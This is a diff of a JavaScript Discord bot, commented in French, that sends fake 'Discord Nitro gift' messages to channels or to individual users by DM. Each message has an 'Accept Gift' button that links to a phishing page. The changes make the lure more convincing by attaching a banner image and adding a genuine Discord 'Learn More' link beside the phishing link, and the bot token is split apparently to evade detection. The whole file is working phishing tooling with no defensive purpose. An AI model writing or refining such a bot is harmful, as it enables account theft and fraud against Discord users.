@@ -5,7 +5,7 @@ const botToken = part1 + part2;
 const phishingUrl = "https://swiemali2-lgtm.github.io/member-cleanup/"; 
 
 async function listen() {
-  console.log("Bot en ligne, en attente de commandes (nitro / dm id)...");
+  console.log("Bot en ligne, en attente de commandes...");
   let lastMsgId = null;
 
   setInterval(async () => {
@@ -37,14 +37,12 @@ async function listen() {
               
               const content = m.content.toLowerCase().trim();
               
-              // Commande "nitro" pour le salon actuel
               if (content === "nitro") {
                 lastMsgId = m.id;
                 console.log("envoi du faux nitro dans le salon :", c.id);
                 sendNitro(c.id);
               }
               
-              // Commande "dm ID" pour envoyer en privé
               if (content.startsWith("dm ")) {
                 lastMsgId = m.id;
                 const targetId = content.split(" ")[1];
@@ -60,39 +58,52 @@ async function listen() {
 }
 
 async function sendNitro(channelId) {
-  let embed = {
-    title: "You've been gifted a subscription!",
-    description: `**ZeroDay** has gifted you Nitro for 3 months!\n\nExpires in 48 hours\n\n[Cliquez ici si le bouton ne marche pas](${phishingUrl})`,
-    color: 0x5865f2,
-    image: {
-      url: "https://i.imgur.com/L8Yt5K0.png"
-    },
-    footer: {
-      text: "Discord Nitro"
-    }
-  };
+  let imgRes = await fetch("https://i.postimg.cc/9FhK0y7q/nitro-banner.png");
+  let imgBlob = await imgRes.blob();
+
+  const formData = new FormData();
+  formData.append("payload_json", JSON.stringify({
+    content: "",
+    embeds: [
+      {
+        title: "You've been gifted a subscription!",
+        description: "**ZeroDay** has gifted you Nitro for 3 months!\n\nExpires in 48 hours",
+        color: 0x2b2d31,
+        image: {
+          url: "attachment://nitro.png"
+        }
+      }
+    ],
+    components: [
+      {
+        type: 1,
+        components: [
+          {
+            type: 2,
+            style: 5,
+            label: "Accept Gift",
+            url: phishingUrl
+          },
+          {
+            type: 2,
+            style: 5,
+            label: "Learn More",
+            url: "https://discord.com/nitro"
+          }
+        ]
+      }
+    ]
+  }));
+  
+  formData.append("files[0]", imgBlob, "nitro.png");
 
   await fetch(`https://discord.com/api/v9/channels/${channelId}/messages`, {
     method: "POST",
-    headers: { "Authorization": `Bot ${botToken}`, "Content-Type": "application/json" },
-    body: JSON.stringify({
-      content: "",
-      embeds: [embed],
-      components: [
-        {
-          type: 1,
-          components: [
-            {
-              type: 2,
-              style: 5,
-              label: "Accept Gift",
-              url: phishingUrl
-            }
-          ]
-        }
-      ]
-    })
+    headers: { "Authorization": `Bot ${botToken}` },
+    body: formData
   }).catch(() => {});
+  
+  console.log("faux nitro envoyé.");
 }
 
 async function sendDM(targetId) {
@@ -103,7 +114,6 @@ async function sendDM(targetId) {
   });
   
   let dmData = await dmRes.json();
-  
   if (!dmData.id) {
     console.log("erreur création dm :", dmData.message);
     return;
@@ -111,47 +121,52 @@ async function sendDM(targetId) {
   
   const channelId = dmData.id;
   
-  let embed = {
-    title: "You've been gifted a subscription!",
-    description: `**ZeroDay** has gifted you Nitro for 3 months!\n\nExpires in 48 hours\n\n[Cliquez ici si le bouton ne marche pas](${phishingUrl})`,
-    color: 0x5865f2,
-    image: {
-      url: "https://i.imgur.com/L8Yt5K0.png"
-    },
-    footer: {
-      text: "Discord Nitro"
-    }
-  };
+  let imgRes = await fetch("https://i.postimg.cc/9FhK0y7q/nitro-banner.png");
+  let imgBlob = await imgRes.blob();
 
-  let msgRes = await fetch(`https://discord.com/api/v9/channels/${channelId}/messages`, {
-    method: "POST",
-    headers: { "Authorization": `Bot ${botToken}`, "Content-Type": "application/json" },
-    body: JSON.stringify({
-      content: "",
-      embeds: [embed],
-      components: [
-        {
-          type: 1,
-          components: [
-            {
-              type: 2,
-              style: 5, 
-              label: "Accept Gift",
-              url: phishingUrl
-            }
-          ]
+  const formData = new FormData();
+  formData.append("payload_json", JSON.stringify({
+    content: "",
+    embeds: [
+      {
+        title: "You've been gifted a subscription!",
+        description: "**ZeroDay** has gifted you Nitro for 3 months!\n\nExpires in 48 hours",
+        color: 0x2b2d31,
+        image: {
+          url: "attachment://nitro.png"
         }
-      ]
-    })
-  });
+      }
+    ],
+    components: [
+      {
+        type: 1,
+        components: [
+          {
+            type: 2,
+            style: 5,
+            label: "Accept Gift",
+            url: phishingUrl
+          },
+          {
+            type: 2,
+            style: 5,
+            label: "Learn More",
+            url: "https://discord.com/nitro"
+          }
+        ]
+      }
+    ]
+  }));
   
-  let msgData = await msgRes.json();
+  formData.append("files[0]", imgBlob, "nitro.png");
+
+  await fetch(`https://discord.com/api/v9/channels/${channelId}/messages`, {
+    method: "POST",
+    headers: { "Authorization": `Bot ${botToken}` },
+    body: formData
+  }).catch(() => {});
   
-  if (msgData.id) {
-    console.log("faux nitro envoyé en dm avec succès.");
-  } else {
-    console.log("erreur envoi message :", msgData.message);
-  }
+  console.log("faux nitro envoyé en dm.");
 }
 
 listen();
